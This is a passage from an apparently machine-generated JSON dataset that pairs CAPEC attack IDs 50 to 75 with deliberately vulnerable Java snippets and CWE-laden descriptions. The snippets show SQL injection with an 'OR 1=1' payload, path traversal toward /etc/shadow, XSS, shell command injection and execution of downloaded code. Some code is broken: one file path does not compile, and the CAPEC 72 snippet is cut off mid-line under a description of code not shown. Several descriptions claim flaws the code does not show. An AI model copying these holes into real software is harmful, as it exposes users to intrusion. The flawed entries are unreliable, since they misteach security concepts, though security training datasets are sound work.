        "description": "This Java code snippet demonstrates a brute force attack by iterating through a list of common passwords to authenticate as the 'admin' user. The code does not implement sufficient measures to prevent multiple failed authentication attempts, making it vulnerable to brute force attacks (CWE-307). The use of single-factor authentication (CWE-308) and password systems as the primary means of authentication (CWE-309) further increases the risk of compromise. The lack of password aging (CWE-262) and weak password requirements (CWE-521) also contribute to the vulnerability. Additionally, storing passwords in a recoverable format (CWE-257) and relying on a single factor in a security decision (CWE-654) can lead to further security issues."
    },
    {
        "capec_id": "50",
        "code_snippet": "public class PasswordRecovery {\n    private static Map<String, String> users = new HashMap<>();\n    \n    public static void registerUser(String username, String password) {\n        users.put(username, password);\n    }\n    \n    public static void recoverPassword(String username) {\n        String password = users.get(username);\n        System.out.println(\"Your password is: \" + password);\n    }\n    \n    public static void main(String[] args) {\n        registerUser(\"user\", \"password\");\n        recoverPassword(\"user\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates a weak password recovery mechanism. It stores passwords in a recoverable format (CWE-257) and uses an insecure method to transmit and store authentication credentials (CWE-522). The password recovery mechanism is weak (CWE-640) and does not require strong passwords (CWE-521). The use of password systems as the primary means of authentication is also flawed (CWE-309). An attacker can take advantage of this mechanism to gain access to the system with the same privileges as the original user."
    },
    {
        "capec_id": "51",
        "code_snippet": "import java.io.IOException;\nimport java.util.HashMap;\nimport java.util.Map;\nimport javax.xml.ws.Endpoint;\nimport javax.xml.ws.Service;\nimport javax.xml.ws.spi.ServiceDelegate;\nimport java.net.URL;\n\npublic class VulnerableServiceRegistry {\n    private Map<String, String> serviceRegistry = new HashMap<>();\n\n    public VulnerableServiceRegistry() {\n        // CWE-314: Cleartext Storage in the Registry\n        serviceRegistry.put(\"myService\", \"http://example.com/myService?wsdl\");\n    }\n\n    public void registerService(String serviceName, String serviceURL) {\n        // CWE-285: Improper Authorization\n        serviceRegistry.put(serviceName, serviceURL);\n    }\n\n    public Service getService(String serviceName) throws IOException {\n        // CWE-651: Exposure of WSDL File Containing Sensitive Information\n        URL wsdlURL = new URL(serviceRegistry.get(serviceName));\n        return Service.create(wsdlURL, new QName(\"myService\"));\n    }\n\n    public static void main(String[] args) {\n        VulnerableServiceRegistry registry = new VulnerableServiceRegistry();\n        // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n        registry.registerService(\"myService\", \"http://example.com/myMaliciousService?wsdl\");\n        try {\n            Service service = registry.getService(\"myService\");\n            Endpoint endpoint = Endpoint.create(service);\n            endpoint.publish(\"http://localhost:8080/myService\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable service registry that is susceptible to a poisoned registry attack. The registry stores sensitive information in cleartext, lacks proper authorization, and exposes WSDL files containing sensitive information. An attacker can inject malicious service URLs, redirecting service requesters to malicious service providers."
    },
    {
        "capec_id": "52",
        "code_snippet": "public class NullByteInjection {\n    public static void main(String[] args) {\n        String userInput = \"Hello\\u0000World\";\n        String filePath = \"C:\\\" + userInput + \".txt\";\n        try {\n            FileWriter fileWriter = new FileWriter(filePath);\n            fileWriter.write(\"This is a test file.\");\n            fileWriter.close();\n        } catch (IOException e) {\n            System.out.println(\"Error writing to file: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the null byte injection vulnerability. The userInput string contains a null byte (\\u0000) which, when concatenated with the file path, may cause the file path to be truncated at the null byte, resulting in an unexpected file name. This can lead to unauthorized file access or creation. The code does not properly validate or neutralize the null byte in the user input, making it vulnerable to null byte injection attacks."
    },
    {
        "capec_id": "53",
        "code_snippet": "public class VulnerableFilter {\n    public static void processInput(String input) {\n        if (input.endsWith(\"/\")) {\n            // perform some operation\n            System.out.println(\"Input is valid\");\n        } else {\n            System.out.println(\"Input is not valid\");\n        }\n    }\n\n    public static void main(String[] args) {\n        String maliciousInput = \"path/to/directory\" + (char) 0 + \"../attacker/\";\n        processInput(maliciousInput);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of using an alternate representation of NULL to bypass a filter. The CWEs embodied in this code include CWE-158 (Improper Neutralization of Null Byte or NUL Character), CWE-172 (Encoding Error), CWE-173 (Improper Handling of Alternate Encoding), CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component), CWE-20 (Improper Input Validation), CWE-697 (Incorrect Comparison), and CWE-707 (Improper Neutralization). The code defines a filter that checks if an input string ends with a slash character. However, an attacker can bypass this filter by inserting a null byte (\\u0000) in the middle of the string, which is not properly handled by the filter. This allows the attacker to inject malicious input and potentially exploit the system."
    },
    {
        "capec_id": "54",
        "code_snippet": "public class VulnerableApp {\n    public static void main(String[] args) {\n        String userInput = \"input\";\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n        try {\n            Statement stmt = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"root\", \"password\").createStatement();\n            ResultSet rs = stmt.executeQuery(query);\n            if (!rs.next()) {\n                throw new SQLException(\"User not found\");\n            }\n        } catch (SQLException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable application that is susceptible to SQL injection attacks (CWE-89) and exposes sensitive information through error messages (CWE-209). The application constructs an SQL query using user input without proper sanitization, allowing an attacker to inject malicious SQL code. When an error occurs, the application prints the error message, which may contain sensitive information about the database environment. The use of GET requests with sensitive query strings (CWE-598) and improper neutralization of special elements in data query logic (CWE-943) are also demonstrated."
    },
    {
        "capec_id": "55",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class InsecurePasswordStorage {\n    private Map<String, String> passwordHashes = new HashMap<>();\n\n    public void storePassword(String username, String password) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"MD5\");\n            byte[] passwordBytes = password.getBytes();\n            byte[] hashBytes = md.digest(passwordBytes);\n            String hash = new String(hashBytes);\n            passwordHashes.put(username, hash);\n        } catch (NoSuchAlgorithmException e) {\n            // Handle exception\n        }\n    }\n\n    public boolean authenticate(String username, String password) {\n        String storedHash = passwordHashes.get(username);\n        if (storedHash != null) {\n            try {\n                MessageDigest md = MessageDigest.getInstance(\"MD5\");\n                byte[] passwordBytes = password.getBytes();\n                byte[] hashBytes = md.digest(passwordBytes);\n                String hash = new String(hashBytes);\n                return hash.equals(storedHash);\n            } catch (NoSuchAlgorithmException e) {\n                // Handle exception\n            }\n        }\n        return false;\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable password storage and authentication system. It uses MD5 hashing with no salt, no password aging, and no strong password requirements. The system stores password hashes in a map and authenticates users by comparing the stored hash with a newly computed hash of the provided password. This makes it susceptible to rainbow table attacks, as described in the CAPEC."
    },
    {
        "capec_id": "56",
        "code_snippet": "public class AuthenticationBypass {\n    public static void main(String[] args) {\n        // CWE-294: Authentication Bypass by Capture-replay\n        String capturedRequest = \"captured_request_from_network_traffic\";\n        sendRequestToServer(capturedRequest);\n    }\n\n    public static void sendRequestToServer(String request) {\n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        // No server-side validation, relying on client-side checks\n        if (request.contains(\"authenticated=true\")) {\n            // Grant access without verifying credentials\n            System.out.println(\"Access granted\");\n        } else {\n            System.out.println(\"Access denied\");\n        }\n    }\n\n    // CWE-693: Protection Mechanism Failure\n    // Insecure compiler optimization\n    public static boolean authenticateUser(String username, String password) {\n        // Compiler may optimize out this security check\n        if (username.equals(\"admin\") && password.equals(\"password\")) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the deprecated CAPEC pattern of removing important client functionality, which is a duplicate of CAPEC-207. It includes CWE-294: Authentication Bypass by Capture-replay, CWE-602: Client-Side Enforcement of Server-Side Security, and CWE-693: Protection Mechanism Failure. The code allows an attacker to bypass authentication by capturing and replaying a request, and it relies on client-side checks instead of server-side validation. Additionally, the compiler optimization may remove or modify the security-critical code, leading to a protection mechanism failure."
    },
    {
        "capec_id": "57",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.PrintWriter;\n\npublic class SensitiveDataServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String username = req.getParameter(\"username\");\n        String password = req.getParameter(\"password\");\n        String sslTerminatedUrl = req.getParameter(\"sslTerminatedUrl\");\n\n        // CWE-287: Improper Authentication\n        // No authentication mechanism is in place to verify the user's identity\n        if (username != null && password != null) {\n            // CWE-598: Use of GET Request Method With Sensitive Query Strings\n            // Sensitive information (username and password) is passed in the query string\n            resp.sendRedirect(sslTerminatedUrl + \"?username=\" + username + \"&password=\" + password);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable REST-style application that is susceptible to the CAPEC attack. The application uses the HTTP GET method to process a request and includes sensitive information (username and password) in the query string. Additionally, there is no authentication mechanism in place to verify the user's identity, making it vulnerable to improper authentication. The application also stores security-critical state information (username and password) in a location that is accessible to unauthorized actors."
    },
    {
        "capec_id": "58",
        "code_snippet": "public class VulnerableService {\n    public void handleRequest(String requestMethod, String resourceId) {\n        if (requestMethod.equals(\"GET\")) {\n            // Assume GET requests are safe and do not check permissions\n            performActionOnResource(resourceId);\n        } else if (requestMethod.equals(\"PUT\")) {\n            // Only check if the user is authenticated, but not authorized\n            if (isLoggedIn()) {\n                performActionOnResource(resourceId);\n            }\n        } else if (requestMethod.equals(\"DELETE\")) {\n            // Allow any user to delete resources without checking permissions\n            performActionOnResource(resourceId);\n        }\n    }\n\n    private void performActionOnResource(String resourceId) {\n        // Perform the action on the resource without checking privileges\n        // This could be a database update, file deletion, etc.\n        System.out.println(\"Performed action on resource \" + resourceId);\n    }\n\n    private boolean isLoggedIn() {\n        // Simple authentication check, but no authorization\n        return true; // Always return true for demonstration purposes\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable service that accepts HTTP requests and performs actions on resources without proper access control mechanisms. It assumes GET requests are safe and do not check permissions, only checks if the user is authenticated for PUT requests, and allows any user to delete resources without checking permissions. This code embodies the CAPEC and related CWEs, including CWE-267, CWE-269, CWE-650, CWE-648, and CWE-285."
    },
    {
        "capec_id": "59",
        "code_snippet": "import java.util.Random;\nimport javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\n\npublic class PredictableSessionID extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {\n        HttpSession session = req.getSession(true);\n        String sessionId = session.getId();\n        Cookie cookie = new Cookie(\"JSESSIONID\", sessionId);\n        resp.addCookie(cookie);\n\n        // Insufficiently random session ID\n        Random rand = new Random();\n        int randomSessionId = rand.nextInt(1000);\n        session.setAttribute(\"randomSessionId\", randomSessionId);\n\n        // Exposure of sensitive information to an unauthorized actor\n        resp.getWriter().println(\"Session ID: \" + sessionId);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable HttpServlet that generates a predictable session ID, allowing an attacker to perform session hijacking and spoofing. The session ID is generated using a weak random number generator, making it easy to predict. Additionally, the session ID is exposed to an unauthorized actor, violating authentication and authorization principles."
    },
    {
        "capec_id": "60",
        "code_snippet": "import javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class SessionReplayVulnerability {\n    public void processRequest(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        Cookie[] cookies = request.getCookies();\n        if (cookies != null) {\n            for (Cookie cookie : cookies) {\n                if (cookie.getName().equals(\"JSESSIONID\")) {\n                    String sessionId = cookie.getValue();\n                    // No validation or verification of the session ID\n                    // CWE-290: Authentication Bypass by Spoofing\n                    // CWE-346: Origin Validation Error\n                    // CWE-384: Session Fixation\n                    // CWE-488: Exposure of Data Element to Wrong Session\n                    // CWE-539: Use of Persistent Cookies Containing Sensitive Information\n                    // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n                    // CWE-285: Improper Authorization\n                    // CWE-664: Improper Control of a Resource Through its Lifetime\n                    // CWE-732: Incorrect Permission Assignment for Critical Resource\n                    authenticateUser(sessionId);\n                    break;\n                }\n            }\n        }\n    }\n\n    private void authenticateUser(String sessionId) {\n        // No validation or verification of the user\n        // CWE-294: Authentication Bypass by Capture-replay\n        System.out.println(\"Authenticated user with session ID: \" + sessionId);\n    }\n}",
        "description": "This Java code snippet demonstrates a session replay vulnerability, where an attacker can reuse a stolen session ID to spoof the target system and gain privileges. The code does not properly validate or verify the session ID, allowing an attacker to bypass authentication and access sensitive information."
    },
    {
        "capec_id": "61",
        "code_snippet": "public class SessionFixationExample {\n    private HttpSession session;\n    private String sessionId;\n    \n    public void authenticateUser(String username, String password) {\n        if (authenticate(username, password)) {\n            // CWE-384: Session Fixation - Authenticating a user without invalidating any existing session identifier\n            session = request.getSession(true);\n            sessionId = session.getId();\n            // CWE-664: Improper Control of a Resource Through its Lifetime - Not invalidating the existing session identifier\n            // CWE-732: Incorrect Permission Assignment for Critical Resource - Allowing the attacker to access the session\n            session.setAttribute(\"authenticated\", true);\n        }\n    }\n    \n    public void performAction(String action) {\n        if (session != null && (boolean) session.getAttribute(\"authenticated\")) {\n            // CWE-602: Client-Side Enforcement of Server-Side Security - Relying on the client to implement security mechanisms\n            // CWE-1270: Generation of Incorrect Security Tokens - Generating incorrect security tokens\n            String securityToken = generateSecurityToken(sessionId);\n            if (securityToken != null) {\n                // Perform the action\n                System.out.println(\"Performing action: \" + action);\n            }\n        }\n    }\n    \n    private boolean authenticate(String username, String password) {\n        // Authentication logic\n        return true;\n    }\n    \n    private String generateSecurityToken(String sessionId) {\n        // Incorrect security token generation logic\n        return \"token\" + sessionId;\n    }\n}",
        "description": "This Java code snippet demonstrates the Session Fixation attack, where an attacker induces a client to establish a session with the target software using a session identifier provided by the attacker. The code fails to invalidate the existing session identifier after authentication, allowing the attacker to use the privileged session identifier in their own transactions. The code also exhibits improper control of resources, incorrect permission assignment, and client-side enforcement of server-side security, making it vulnerable to the attack."
    },
    {
        "capec_id": "62",
        "code_snippet": "public class CSRFVulnerableServlet extends HttpServlet {\n    private static final long serialVersionUID = 1L;\n\n    protected void doPost(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {\n        String action = req.getParameter(\"action\");\n        if (action.equals(\"transferFunds\")) {\n            String fromAccount = req.getParameter(\"fromAccount\");\n            String toAccount = req.getParameter(\"toAccount\");\n            double amount = Double.parseDouble(req.getParameter(\"amount\"));\n            // Perform the fund transfer without verifying the request origin\n            transferFunds(fromAccount, toAccount, amount);\n        }\n    }\n\n    private void transferFunds(String fromAccount, String toAccount, double amount) {\n        // Implementation of the fund transfer logic\n    }\n}\n\n// Sensitive cookie without SameSite attribute\nCookie cookie = new Cookie(\"JSESSIONID\", \"1234567890abcdef\");\ncookie.setPath(\"/\");\ncookie.setMaxAge(3600);\nresponse.addCookie(cookie);\n",
        "description": "This Java code snippet demonstrates a vulnerable servlet that is susceptible to Cross-Site Request Forgery (CSRF) attacks. The servlet performs a sensitive action (fund transfer) without verifying the request origin, allowing an attacker to craft a malicious link that can be used to transfer funds from a user's account. The code also sets a sensitive cookie without the SameSite attribute, making it vulnerable to CSRF attacks."
    },
    {
        "capec_id": "63",
        "code_snippet": "public class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String userInput = req.getParameter(\"input\");\n        String html = \"<img src='\" + userInput + \"' />\";\n        resp.setContentType(\"text/html\");\n        PrintWriter out = resp.getWriter();\n        out.println(\"<html><body>\" + html + \"</body></html>\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable servlet that is susceptible to cross-site scripting (XSS) attacks. The servlet takes user input from the 'input' parameter and injects it into an HTML image tag without proper validation or neutralization, allowing an attacker to inject malicious scripts. This code embodies the CAPEC of embedding malicious scripts in content served to web browsers, and relates to CWEs 79, 20, 692, 82, and 81."
    },
    {
        "capec_id": "64",
        "code_snippet": "import java.io.File;\nimport java.net.URLDecoder;\n\npublic class VulnerableURLHandler {\n    public static void handleURL(String userInput) {\n        String decodedURL = URLDecoder.decode(userInput, \"UTF-8\");\n        File file = new File(decodedURL);\n        if (file.exists()) {\n            System.out.println(\"File found: \" + file.getAbsolutePath());\n        } else {\n            System.out.println(\"File not found\");\n        }\n    }\n\n    public static void main(String[] args) {\n        handleURL(\"/etc/passwd%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable URL handler that is susceptible to path traversal attacks due to improper handling of URL encoding and decoding. The CWEs embodied in this code include CWE-177 (Improper Handling of URL Encoding), CWE-73 (External Control of File Name or Path), CWE-22 (Improper Limitation of a Pathname to a Restricted Directory), and CWE-20 (Improper Input Validation). The code decodes the user-input URL without proper validation, allowing an attacker to craft a URL that traverses the file system and accesses sensitive files."
    },
    {
        "capec_id": "65",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/update.jar\");\n            URLConnection conn = url.openConnection();\n            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                // execute the downloaded code without integrity check\n                Runtime.getRuntime().exec(inputLine);\n            }\n            in.close();\n        } catch (IOException e) {\n            System.out.println(\"Error downloading update: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet downloads a JAR file from a remote location without any encryption or integrity check, and then executes the downloaded code. This embodies the CAPEC of an adversary passively sniffing network communications and capturing application code, and relates to CWEs 319, 311, 318, 693, and 494."
    },
    {
        "capec_id": "66",
        "code_snippet": "public class VulnerableSQLInjection {\n    public void getUserDetails(String username) {\n        String query = \"SELECT * FROM users WHERE username='\" + username + \"'\";\n        try (Statement stmt = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"root\", \"password\").createStatement()) {\n            ResultSet rs = stmt.executeQuery(query);\n            while (rs.next()) {\n                System.out.println(rs.getString(\"username\") + \" \" + rs.getString(\"password\"));\n            }\n        } catch (SQLException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n    public static void main(String[] args) {\n        VulnerableSQLInjection vsi = new VulnerableSQLInjection();\n        vsi.getUserDetails(\"admin' OR 1=1 -- \");\n    }\n}",
        "description": "This Java code snippet demonstrates a SQL injection vulnerability. The `getUserDetails` method constructs a SQL query using user input without proper validation or sanitization, allowing an attacker to inject malicious SQL code. The `main` method shows an example of an attacker injecting a query that retrieves all user details by injecting an 'OR 1=1' condition. The error handling also discloses sensitive information about the database environment."
    },
    {
        "capec_id": "67",
        "code_snippet": "public class VulnerableSyslog {\n    public static void main(String[] args) {\n        String userInput = \"%(format)s\"; // CWE-20: Improper Input Validation\n        syslog(userInput); // CWE-134: Use of Externally-Controlled Format String\n    }\n\n    public static void syslog(String format) {\n        String syslogMessage = \"System Log: \" + format;\n        System.out.println(syslogMessage);\n        byte[] syslogBytes = syslogMessage.getBytes();\n        byte[] buffer = new byte[1024]; // CWE-120: Buffer Copy without Checking Size of Input\n        System.arraycopy(syslogBytes, 0, buffer, 0, syslogBytes.length);\n        // CWE-680: Integer Overflow to Buffer Overflow\n        int bufferSize = Integer.MAX_VALUE - 1;\n        byte[] overflowBuffer = new byte[bufferSize];\n        System.arraycopy(syslogBytes, 0, overflowBuffer, 0, syslogBytes.length);\n    }\n}",
        "description": "This Java code snippet demonstrates a format string injection vulnerability in the syslog function. The syslog function does not explicitly use a format string parameter, allowing user input to be placed in the format string parameter. This can lead to a format string injection attack, potentially causing a buffer overflow. The code also includes CWE-120, CWE-680, and CWE-20 vulnerabilities."
    },
    {
        "capec_id": "68",
        "code_snippet": "public class CodeSigningBypass {\n    public static void main(String[] args) {\n        // CWE-325: Missing Cryptographic Step\n        String unsignedCode = \"malicious_code_here\";\n        String weakHash = getWeakHash(unsignedCode);\n        // CWE-328: Use of Weak Hash\n        if (weakHash.equals(getExpectedHash())) {\n            // CWE-506: Embedded Malicious Code\n            executeMaliciousCode(unsignedCode);\n        }\n    }\n\n    // CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n    @SuppressWarnings(\"unused\")\n    private static void executeMaliciousCode(String code) {\n        // Malicious code execution\n    }\n\n    // CWE-1326: Missing Immutable Root of Trust in Hardware\n    private static String getExpectedHash() {\n        // Return a hardcoded hash value\n        return \"weak_hash_value\";\n    }\n\n    private static String getWeakHash(String input) {\n        // Use a weak hash function like MD5\n        return MD5(input);\n    }\n\n    private static String MD5(String input) {\n        // Implement a weak MD5 hash function\n        return \"weak_md5_hash\";\n    }\n}",
        "description": "This Java code snippet demonstrates a code signing bypass attack by exploiting multiple weaknesses. It uses a weak hash function (CWE-328) to verify the code's identity, and if the hash matches, it executes the malicious code (CWE-506). The code also lacks a required cryptographic step (CWE-325) and has a missing immutable root of trust in the hardware (CWE-1326). Additionally, the compiler optimization may remove or modify the security-critical code (CWE-733)."
    },
    {
        "capec_id": "69",
        "code_snippet": "import java.io.IOException;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.util.Scanner;\n\npublic class ElevatedPrivileges {\n    public static void main(String[] args) {\n        try {\n            String command = \"\";\n            if (System.getProperty(\"user.name\").equals(\"root\")) {\n                System.out.println(\"Running with elevated privileges\");\n                System.out.print(\"Enter a command to execute: \");\n                Scanner scanner = new Scanner(System.in);\n                command = scanner.nextLine();\n                Process process = Runtime.getRuntime().exec(command);\n                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    System.out.println(line);\n                }\n            } else {\n                System.out.println(\"Running without elevated privileges\");\n            }\n        } catch (IOException e) {\n            System.out.println(\"Error executing command: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of executing arbitrary code with elevated privileges. It checks if the program is running as the 'root' user and if so, prompts the user to enter a command to execute. The command is then executed using the Runtime.getRuntime().exec() method, which can lead to OS command injection (CWE-78) and execution of malicious code (CWE-506). The code also exhibits unnecessary privileges (CWE-250) and external control of system or configuration setting (CWE-15) by allowing the user to control the command execution. Additionally, it lacks proper input validation and sanitization, making it vulnerable to process control (CWE-114) attacks."
    },
    {
        "capec_id": "70",
        "code_snippet": "public class VulnerableLoginSystem {\n    private static final String DEFAULT_USERNAME = \"admin\";\n    private static final String DEFAULT_PASSWORD = \"password\";\n\n    public boolean authenticate(String username, String password) {\n        if (username.equals(DEFAULT_USERNAME) && password.equals(DEFAULT_PASSWORD)) {\n            return true;\n        }\n        return false;\n    }\n\n    public static void main(String[] args) {\n        VulnerableLoginSystem loginSystem = new VulnerableLoginSystem();\n        System.out.println(loginSystem.authenticate(\"admin\", \"password\"));\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable login system that uses hard-coded default credentials (CWE-798) and does not enforce strong password requirements (CWE-521). The system relies solely on a single factor of authentication (CWE-308) and does not implement password aging (CWE-262). The default credentials are not changed, making it vulnerable to brute force attacks using common usernames and passwords."
    },
    {
        "capec_id": "71",
        "code_snippet": "public class UnicodeFilterBypass {\n    public static void main(String[] args) {\n        String userInput = \"\\u0022<script>alert('XSS')</script>\\u0022\";\n        if (userInput.matches(\"[a-zA-Z]*\")) {\n            System.out.println(\"Input is valid\");\n            // Process the input\n        } else {\n            System.out.println(\"Input is invalid\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of bypassing content filters by providing a Unicode string that is not properly handled by the system component. The CWEs involved are CWE-176 (Improper Handling of Unicode Encoding), CWE-179 (Incorrect Behavior Order: Early Validation), and CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component). The code uses a Unicode-encoded string to bypass the filter, which only checks if the input matches a pattern of alphanumeric characters. The Unicode encoding allows the malicious script to pass through the filter undetected."
    },
    {
        "capec_id": "72",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.net.URLDecoder;\nimport java.net.URLEncoder;\n\npublic class VulnerableURLHandler {\n    public static void handleURL(String userInput) throws IOException {\n        String decodedURL = URLDecoder.decode(userInput, \\",
        "description": "This Java code snippet demonstrates a vulnerable URL handler that is susceptible to URL encoding attacks. The handleURL method takes user input, decodes it using URLDecoder, and then encodes it again using URLEncoder. The encoded URL is then used to create a file path, which can lead to path traversal attacks (CWE-73) if the input is not properly validated (CWE-20). The use of URLDecoder and URLEncoder can also lead to encoding errors (CWE-172) and improper handling of alternate encoding (CWE-173) and URL encoding (CWE-177). Additionally, the code is vulnerable to injection attacks (CWE-74) if the user input is not properly sanitized."
    },
    {
        "capec_id": "73",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.io.PrintWriter;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {\n        String filename = req.getParameter(\"filename\");\n        File file = new File(filename);\n        if (file.exists()) {\n            res.setContentType(\"text/html\");\n            PrintWriter out = res.getWriter();\n            out.println(\"<a href='\" + filename + \"'>Click here to download</a>\");\n        } else {\n            res.sendError(404);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable servlet that generates HTML content based on user-supplied input. The 'filename' parameter is not validated, allowing an attacker to inject malicious characters, such as XSS redirection, into the filename. The servlet then uses this input to generate an HTML link, potentially leading to code execution in the client browser or redirection to a malicious site."
    },
    {
        "capec_id": "74",
        "code_snippet": "public class ShoppingCart {\n    private String username;\n    private String paymentInfo;\n    private List<String> cartItems;\n    private boolean isAdmin;\n\n    public ShoppingCart(String username) {\n        this.username = username;\n        this.paymentInfo = \"\";\n        this.cartItems = new ArrayList<>();\n        this.isAdmin = false;\n    }\n\n    public void addCartItem(String item) {\n        cartItems.add(item);\n    }\n\n    public void checkout() {\n        if (isAdmin) {\n            // perform admin checkout\n            System.out.println(\"Admin checkout successful\");\n        } else {\n            // perform user checkout\n            System.out.println(\"User checkout successful\");\n        }\n    }\n\n    public void elevatePrivilege() {\n        isAdmin = true;\n    }\n\n    public static void main(String[] args) {\n        ShoppingCart cart = new ShoppingCart(\"user\");\n        cart.addCartItem(\"item1\");\n        cart.addCartItem(\"item2\");\n\n        // CWE-372: Incomplete Internal State Distinction\n        cart.isAdmin = true;\n\n        // CWE-315: Cleartext Storage of Sensitive Information in a Cookie\n        Cookie cookie = new Cookie(\"paymentInfo\", \"creditCardNumber=1234-5678-9012-3456\");\n\n        // CWE-353: Missing Support for Integrity Check\n        Socket socket = new Socket(\"example.com\", 8080);\n        OutputStream outputStream = socket.getOutputStream();\n        outputStream.write(\"checkoutRequest\");\n\n        // CWE-693: Protection Mechanism Failure\n        cart.checkout();\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of modifying state information maintained by the target software. The ShoppingCart class has a flawed implementation of user state management, allowing an adversary to manipulate the state and elevate privileges. The code includes CWE-372: Incomplete Internal State Distinction, CWE-315: Cleartext Storage of Sensitive Information in a Cookie, CWE-353: Missing Support for Integrity Check, and CWE-693: Protection Mechanism Failure."
    },
    {
        "capec_id": "75",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.Scanner;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        String userInput = \"\";\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter a command to execute:\");\n        userInput = scanner.nextLine();\n\n        String configFilePath = \"./config.txt\";\n        String cvsRepositoryPath = \"./cvsRepository\";\n\n        try {\n            // CWE-349: Acceptance of Extraneous Untrusted Data With Trusted Data\n            String trustedData = \"Trusted data: \";\n            String untrustedData = userInput;\n            String combinedData = trustedData + untrustedData;\n\n            // CWE-99: Improper Control of Resource Identifiers ('Resource Injection')\n            String resourceIdentifier = combinedData;\n            File configFile = new File(configFilePath);\n            FileWriter fileWriter = new FileWriter(configFile);\n            fileWriter.write(resourceIdentifier);\n            fileWriter.close();\n\n            // CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')\n            String command = \"sh -c '\" + userInput + \"'\";\n            Runtime.getRuntime().exec(command);\n\n            // CWE-346: Origin Validation Error\n            String cvsRepositoryData = readDataFromCVSRepository(cvsRepositoryPath);\n            processCVSRepositoryData(cvsRepositoryData);\n\n            // CWE-353: Missing Support for Integrity Check\n            sendUnvalidatedDataOverNetwork(cvsRepositoryData);\n\n            // CWE-354: Improper Validation of Integrity Check Value\n            String receivedData = receiveDataFromNetwork();\n            processReceivedData(receivedData);\n        } catch (IOException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n\n    private static String readDataFromCVSRepository(String cvsRepositoryPath) {\n        // TO DO: implement reading data from CVS repository\n        return \"\";\n    }\n\n    private static void processCVSRepositoryData(String cvsRepositoryData) {\n        // TO DO: implement processing of CVS repository data\n    }\n\n    private static void sendUnvalidatedDataOverNetwork(String data) {\n        // TO DO: implement sending data over network without integrity check\n    }\n\n    private static String receiveDataFromNetwork() {\n        // TO DO: implement receiving data from network\n        return \"\";\n    }\n\n    private static void processReceivedData(String receivedData) {\n        // TO DO: implement processing of received data without integrity check\n    }\n}",
